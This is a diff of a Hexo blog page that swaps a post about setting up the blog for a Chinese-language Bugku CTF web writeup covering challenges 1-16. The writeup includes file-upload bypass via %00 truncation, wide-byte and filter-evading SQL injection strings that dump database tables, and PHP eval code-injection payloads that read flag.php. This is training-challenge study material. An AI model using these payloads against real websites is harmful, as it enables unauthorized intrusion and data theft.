@@ -108,25 +108,49 @@
 
 
 
-  <meta name="description" content="搭建博客搭博客（用的hexo和Github）鼓捣了一天，中途遇到了一些小问题，在用1$ hexo d 部署到Github的时候不成功，猜测其中的原因可能是在Github上创建库的时候第一次输错名字了，后来又改过来的，没有深究，直接简单粗暴地全部删了重新来一遍。 参考链接搭建博客的时候参考了Hpd0ger同学和Ea5ter同学的经验，还有一个Hexo博客搭建全攻略。 结语之前都是在CSDN上写写wr">
-<meta name="keywords" content="随笔">
+  <meta name="description" content="0x01.web2右键查看元素，flag在&amp;lt;body&amp;gt;的注释中。  0x02.文件上传测试上传PHP文件才能得到flag，但是只允许上传图片。方法一：可以先上传图片文件，利用burp抓包，更改文件扩展名为php，即可得到flag。方法二：%00截断，先上传图片文件，利用burp抓包，在文件名后面添加“%00.php”，发送，得到flag。  0x03.计算器右键查看元素，发现表单输入有">
+<meta name="keywords" content="Bugku,CTF,Writeup">
 <meta property="og:type" content="article">
-<meta property="og:title" content="第一篇博文">
-<meta property="og:url" content="https://KRDecad3.github.com/2018/07/18/第一篇博文/index.html">
+<meta property="og:title" content="Bugku CTF Web(1-16) writeup">
+<meta property="og:url" content="https://KRDecad3.github.com/2018/07/20/Bugku-CTF-Web-1-16-writeup/index.html">
 <meta property="og:site_name" content="KRDecad3&#39;s Blog">
-<meta property="og:description" content="搭建博客搭博客（用的hexo和Github）鼓捣了一天，中途遇到了一些小问题，在用1$ hexo d 部署到Github的时候不成功，猜测其中的原因可能是在Github上创建库的时候第一次输错名字了，后来又改过来的，没有深究，直接简单粗暴地全部删了重新来一遍。 参考链接搭建博客的时候参考了Hpd0ger同学和Ea5ter同学的经验，还有一个Hexo博客搭建全攻略。 结语之前都是在CSDN上写写wr">
+<meta property="og:description" content="0x01.web2右键查看元素，flag在&amp;lt;body&amp;gt;的注释中。  0x02.文件上传测试上传PHP文件才能得到flag，但是只允许上传图片。方法一：可以先上传图片文件，利用burp抓包，更改文件扩展名为php，即可得到flag。方法二：%00截断，先上传图片文件，利用burp抓包，在文件名后面添加“%00.php”，发送，得到flag。  0x03.计算器右键查看元素，发现表单输入有">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-07-19T15:49:46.867Z">
+<meta property="og:image" content="https://img-blog.csdn.net/20180528004241646?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180528004403525?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180528004447158?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180528004516342?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/2018052800462176?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180528004652967?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180528004739772?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180528005016802?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/2018052800512253?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180528005144762?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180528005230508?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180528005251960?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180528005318964?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180602171208252?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180602171334314?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180602171400923?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180602171444702?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180602171721539?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180602171727813?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180602171802849?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180602171908292?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180602172051703?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/2018060217213852?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:updated_time" content="2018-07-19T16:16:40.980Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="第一篇博文">
-<meta name="twitter:description" content="搭建博客搭博客（用的hexo和Github）鼓捣了一天，中途遇到了一些小问题，在用1$ hexo d 部署到Github的时候不成功，猜测其中的原因可能是在Github上创建库的时候第一次输错名字了，后来又改过来的，没有深究，直接简单粗暴地全部删了重新来一遍。 参考链接搭建博客的时候参考了Hpd0ger同学和Ea5ter同学的经验，还有一个Hexo博客搭建全攻略。 结语之前都是在CSDN上写写wr">
+<meta name="twitter:title" content="Bugku CTF Web(1-16) writeup">
+<meta name="twitter:description" content="0x01.web2右键查看元素，flag在&amp;lt;body&amp;gt;的注释中。  0x02.文件上传测试上传PHP文件才能得到flag，但是只允许上传图片。方法一：可以先上传图片文件，利用burp抓包，更改文件扩展名为php，即可得到flag。方法二：%00截断，先上传图片文件，利用burp抓包，在文件名后面添加“%00.php”，发送，得到flag。  0x03.计算器右键查看元素，发现表单输入有">
+<meta name="twitter:image" content="https://img-blog.csdn.net/20180528004241646?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
 
 
 
 
 
 
-  <link rel="canonical" href="https://KRDecad3.github.com/2018/07/18/第一篇博文/"/>
+  <link rel="canonical" href="https://KRDecad3.github.com/2018/07/20/Bugku-CTF-Web-1-16-writeup/"/>
 
 
 
@@ -136,7 +160,7 @@
   };
 </script>
 
-  <title>第一篇博文 | KRDecad3's Blog</title>
+  <title>Bugku CTF Web(1-16) writeup | KRDecad3's Blog</title>
   
 
 
@@ -336,7 +360,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://KRDecad3.github.com/2018/07/18/第一篇博文/">
+    <link itemprop="mainEntityOfPage" href="https://KRDecad3.github.com/2018/07/20/Bugku-CTF-Web-1-16-writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="KRDecad3">
@@ -353,7 +377,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">第一篇博文
+          <h1 class="post-title" itemprop="name headline">Bugku CTF Web(1-16) writeup
               
             
           </h1>
@@ -378,24 +402,12 @@
                 
               
 
-              <time title="创建时间：2018-07-18 00:00:00" itemprop="dateCreated datePublished" datetime="2018-07-18T00:00:00+08:00">2018-07-18</time>
+              <time title="创建时间：2018-07-20 00:14:04 / 修改时间：00:16:40" itemprop="dateCreated datePublished" datetime="2018-07-20T00:14:04+08:00">2018-07-20</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2018-07-19 23:49:46" itemprop="dateModified" datetime="2018-07-19T23:49:46+08:00">2018-07-19</time>
               
             
           </span>
@@ -412,7 +424,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/随笔/" itemprop="url" rel="index"><span itemprop="name">随笔</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
 
                 
                 
@@ -446,10 +458,51 @@
       
 
       
-        <h2 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h2><p>搭博客（用的hexo和Github）鼓捣了一天，中途遇到了一些小问题，在用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo d</span><br></pre></td></tr></table></figure></p>
-<p>部署到Github的时候不成功，猜测其中的原因可能是在Github上创建库的时候第一次输错名字了，后来又改过来的，没有深究，直接简单粗暴地全部删了重新来一遍。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>搭建博客的时候参考了<a href="http://hpdoger.me/2018/05/26/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" target="_blank" rel="noopener">Hpd0ger</a>同学和<a href="https://ea5ter.github.io/2018/07/09/hexo+github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/" target="_blank" rel="noopener">Ea5ter</a>同学的经验，<br>还有一个<a href="https://github.com/limedroid/HexoLearning" target="_blank" rel="noopener">Hexo博客搭建全攻略</a>。</p>
-<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>之前都是在CSDN上写写writeup，现在刚搭好自己的博客，写下第一篇博文（虽然不太正式），心情倒是挺激动的。<br>这是进道格的第一份暑期任务，算是完成了，后续会完善各种功能，并把学习笔记和心得体会再搬到博客上来。<br>路漫漫其修远兮，吾将上下而求索。</p>
+        <h2 id="0x01-web2"><a href="#0x01-web2" class="headerlink" title="0x01.web2"></a>0x01.web2</h2><p><img src="https://img-blog.csdn.net/20180528004241646?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>右键查看元素，flag在<code>&lt;body&gt;</code>的注释中。</p>
+<hr>
+<h2 id="0x02-文件上传测试"><a href="#0x02-文件上传测试" class="headerlink" title="0x02.文件上传测试"></a>0x02.文件上传测试</h2><p><img src="https://img-blog.csdn.net/20180528004403525?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>上传PHP文件才能得到flag，但是只允许上传图片。<br>方法一：可以先上传图片文件，利用burp抓包，更改文件扩展名为php，即可得到flag。<br>方法二：%00截断，先上传图片文件，利用burp抓包，在文件名后面添加“%00.php”，发送，得到flag。</p>
+<hr>
+<h2 id="0x03-计算器"><a href="#0x03-计算器" class="headerlink" title="0x03.计算器"></a>0x03.计算器</h2><p><img src="https://img-blog.csdn.net/20180528004447158?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>右键查看元素，发现表单输入有限制输入长度，双击修改maxlength再提交计算结果就得到flag。</p>
+<hr>
+<h2 id="0x04-web基础-GET"><a href="#0x04-web基础-GET" class="headerlink" title="0x04.web基础$_GET"></a>0x04.web基础$_GET</h2><p><img src="https://img-blog.csdn.net/20180528004516342?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>通过get方法传入参数使“what”的值等于flag。<br>payload:?what=flag</p>
+<hr>
+<h2 id="0x05-web基础-POST"><a href="#0x05-web基础-POST" class="headerlink" title="0x05.web基础$_POST"></a>0x05.web基础$_POST</h2><p><img src="https://img-blog.csdn.net/2018052800462176?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>通过post方法传入参数使“what”的值等于flag。<br>payload:POST:what=flag</p>
+<hr>
+<h2 id="0x06-矛盾"><a href="#0x06-矛盾" class="headerlink" title="0x06.矛盾"></a>0x06.矛盾</h2><p><img src="https://img-blog.csdn.net/20180528004652967?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>题目要求：既要num的值为不是数字，又要num=1。<br>is_numeric(var)当变量是数字或数字字符串时返回true。<br>传入一个1+字母的字符串，可以使is_numeric()返回false，进而进行弱类型转换，使num==1，得到flag。<br>payload:?num=1a</p>
+<hr>
+<h2 id="0x07-web3"><a href="#0x07-web3" class="headerlink" title="0x07.web3"></a>0x07.web3</h2><p>打开链接后发现不断的弹窗。<br>禁止弹窗后，查看源码，发现<code>&lt;script&gt;</code>注释里有一串unicode编码，解码即得到flag。<br><img src="https://img-blog.csdn.net/20180528004739772?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p>
+<hr>
+<h2 id="0x08-sql注入"><a href="#0x08-sql注入" class="headerlink" title="0x08.sql注入"></a>0x08.sql注入</h2><p><img src="https://img-blog.csdn.net/20180528005016802?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>先尝试单引号，发现返回正常，<br>查看源码，发现文字编码是gb2312，存在宽字节注入。<br>测试：?id=1%df%27 and 1=1–+<br>?id=1%df%27 and 1=2–+<br>不加注释则报错，加注释返回正常。<br>判断字段数：?id=1%df%27 order by 2–+<br>判断回显点：?id=-1%df%27 union select 1,2–+<br><img src="https://img-blog.csdn.net/2018052800512253?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>查询数据库名：?id=-1%df%27 union select 1,database()–+<br><img src="https://img-blog.csdn.net/20180528005144762?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>查询表名：?id=-1%df%27 union select 1,table_name from information_schema.tables where table_schema=0x73716C35–+<br><img src="https://img-blog.csdn.net/20180528005230508?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>查询字段名：?id=-1%df%27 union select 1,column_name from information_schema.columns where table_name=0x6B6579–+<br><img src="https://img-blog.csdn.net/20180528005251960?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>查询string字段得到flag：?id=-1%df%27 union select 1,string from sql5.key–+<br><img src="https://img-blog.csdn.net/20180528005318964?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p>
+<hr>
+<h2 id="0x09域名解析"><a href="#0x09域名解析" class="headerlink" title="0x09域名解析"></a>0x09域名解析</h2><p><img src="https://img-blog.csdn.net/20180602171208252?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>域名解析：把域名指向网站空间IP，让人们通过注册的域名可以方便地访问到网站的一种服务。域名解析就是域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。<br>Windows下域名解析：<br>修改文件C:\windows\system32\drivers\etc\hosts<br><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8858384.html" target="_blank" rel="noopener">Windows10没有修改hosts文件权限的解决方案 </a><br><img src="https://img-blog.csdn.net/20180602171334314?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>在里面添加一条：120.24.86.145  flag.bugku.com保存，<br>再访问此域名，得到flag。<br>在Linux下域名解析：<br>用命令打开hosts文件：sudo gedit /etc/hosts<br><img src="https://img-blog.csdn.net/20180602171400923?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>遇到权限不够的情况时升级为root用户，<br>添加120.24.86.145  flag.bugku.com，保存。<br>再用浏览器打开flag.bugku.com。</p>
+<hr>
+<h2 id="0x10SQL注入1"><a href="#0x10SQL注入1" class="headerlink" title="0x10SQL注入1"></a>0x10SQL注入1</h2><p><img src="https://img-blog.csdn.net/20180602171444702?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>函数substr_count()计算子串在字符串中出现的次数。<br>strip_tags()剥去字符串中的 HTML、XML 以及 PHP 的标签。<br>法一：因为有strip_tags()函数，可以在payload中嵌套HTML标签来绕过。<br>测试：数字型参数，id不需要引号闭合，?id=1–+<br><code>payload:
+?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,database()
+?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,hash fr&lt;&gt;om sql3.key</code><br>法二：利用%00截断<br><code>payload:
+?id=-1 uni%00on sel%00ect 1,database()
+?id=-1 uni%00on sel%00ect 1,hash fr%00om sql3.key</code></p>
+<hr>
+<h2 id="0x11你必须让他停下"><a href="#0x11你必须让他停下" class="headerlink" title="0x11你必须让他停下"></a>0x11你必须让他停下</h2><p><img src="https://img-blog.csdn.net/20180602171721539?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><img src="https://img-blog.csdn.net/20180602171727813?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>reload() 方法用于重新加载当前文档。<br>setTimeout() 方法用于在指定的毫秒数后调用函数或计算表达式。<br>Burp抓包，发送到Repeater，然后不停的“go”，直到在Response中看到flag。</p>
+<hr>
+<h2 id="0x12本地包含"><a href="#0x12本地包含" class="headerlink" title="0x12本地包含"></a>0x12本地包含</h2><p><img src="https://img-blog.csdn.net/20180602171802849?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>函数eval()把字符串按照PHP代码执行，<br>var_dump()打印变量的相关信息，<br>show_source()对文件进行语法高亮显示。<br>通过构造hello参数传递给变量a，进而进行代码执行。<br><code>payload:
+?hello=);print_r(file(&quot;flag.php&quot;)
+?hello=);var_dump(file(&quot;flag.php&quot;)
+?hello=file(&quot;flag.php&quot;)
+?hello=);show_source(&quot;flag.php&quot;);var_dump(
+?hello=);include(@$_POST[&#39;b&#39;]    在POST里： b=php://filter/convert.base64-encode/resource=flag.php
+?hello=);include(&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</code></p>
+<hr>
+<h2 id="0x13变量1"><a href="#0x13变量1" class="headerlink" title="0x13变量1"></a>0x13变量1</h2><p><img src="https://img-blog.csdn.net/20180602171908292?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>函数<br>highlight_file() 函数对文件进行语法高亮显示，<br>preg_match()执行一个正则表达式匹配，其中[\w]表示匹配包括下划线的任何单词字符，类似但不等价于“[A-Za-z0-9_]”，这里的”单词”字符使用Unicode字符集；同时匹配“+”。<br>可变变量：\$\$args表示变量args的值再作为变量名。<br>题目提示flag在变量里，所以使用$GLOBALS数组。<br><code>payload:?args=GLOBALS</code></p>
+<hr>
+<h2 id="0x14web5"><a href="#0x14web5" class="headerlink" title="0x14web5"></a>0x14web5</h2><p>题目提示JSPFUCK，则与jsfuck有关。<br>jsfuck:合法的javascript代码，可在大部分浏览器上执行，用来绕过关键词检测。<br>打开源码发现（截图为局部）<br><img src="https://img-blog.csdn.net/20180602172051703?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>将这一串编码复制，放到控制台执行，得到flag。</p>
+<hr>
+<h2 id="0x15头等舱"><a href="#0x15头等舱" class="headerlink" title="0x15头等舱"></a>0x15头等舱</h2><p>各个地方都没有找到什么，那么根据题目提示，猜测http头可能有什么。<br>抓包，send to Repeater在响应头里发现flag。<br><img src="https://img-blog.csdn.net/2018060217213852?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p>
+<hr>
+<h2 id="0x16web4"><a href="#0x16web4" class="headerlink" title="0x16web4"></a>0x16web4</h2><p>题目提示查看源码，发现源码<code>&lt;script&gt;</code>标签里有URL编码，<br>p1解码为<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> a=<span class="built_in">document</span>.getElementById(<span class="string">"password"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"undefined"</span>!=<span class="keyword">typeof</span> a)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"67d709b2b</span></span><br></pre></td></tr></table></figure></p>
+<p>p2解码为<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">aa648cf6e87a7114f1<span class="string">"==a.value)</span></span><br><span class="line"><span class="string">return!0;</span></span><br><span class="line"><span class="string">alert("</span><span class="built_in">Error</span><span class="string">");</span></span><br><span class="line"><span class="string">a.focus();</span></span><br><span class="line"><span class="string">return!1</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">document.getElementById("</span>levelQuest<span class="string">").onsubmit=checkSubmit;</span></span><br></pre></td></tr></table></figure></p>
+<p>最后的eval(unescape(p1) + unescape(‘%35%34%61%61%32’ + p2));解码为<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">unescape</span>(p1) + <span class="built_in">unescape</span>(<span class="string">'54aa2'</span> + p2));</span><br></pre></td></tr></table></figure></p>
+<p>根据eval()执行代码块的意思拼接出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function checkSubmit()&#123;</span><br><span class="line">var a=document.getElementById(&quot;password&quot;);</span><br><span class="line">//getElementById根据指定的 id 属性值得到对象</span><br><span class="line">if(&quot;undefined&quot;!=typeof a)&#123;</span><br><span class="line">if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)</span><br><span class="line">return!0;</span><br><span class="line">alert(&quot;Error&quot;);</span><br><span class="line">a.focus();</span><br><span class="line">return!1</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;</span><br><span class="line">//onsubmit 事件会在表单中的确认按钮被点击时发生</span><br></pre></td></tr></table></figure></p>
+<p>判断变量a的值是否等于67d709b2b54aa2aa648cf6e87a7114f1<br>好像直接输入字符串提交就可以得到flag。</p>
 
       
     </div>
@@ -499,7 +552,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/随笔/" rel="tag"># 随笔</a>
+            <a href="/tags/Bugku/" rel="tag"># Bugku</a>
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/Writeup/" rel="tag"># Writeup</a>
           
         </div>
       
@@ -512,14 +569,18 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2018/07/20/Bugku-CTF-杂项（21-29）-Writeup/" rel="next" title="Bugku CTF 杂项（21-29） Writeup">
+                <i class="fa fa-chevron-left"></i> Bugku CTF 杂项（21-29） Writeup
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/07/19/Bugku-CTF-加密writeup-（未完待续）/" rel="prev" title="Bugku CTF 加密writeup （未完待续）">
-                Bugku CTF 加密writeup （未完待续） <i class="fa fa-chevron-right"></i>
+              <a href="/2018/07/20/Bugku-CTF-Web-17-Writeup/" rel="prev" title="Bugku CTF Web(17-) Writeup">
+                Bugku CTF Web(17-) Writeup <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -686,7 +747,7 @@
             
 
             
